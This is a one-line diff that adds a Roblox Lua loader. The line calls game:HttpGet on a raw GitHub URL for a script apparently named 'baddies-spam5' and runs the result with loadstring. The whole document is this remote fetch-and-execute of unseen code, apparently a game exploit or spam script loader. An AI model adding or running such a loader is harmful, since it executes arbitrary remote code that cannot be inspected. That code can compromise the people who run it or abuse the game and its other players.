@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/baddies-spam5-z8f51krpm5l9bw.lua"))()
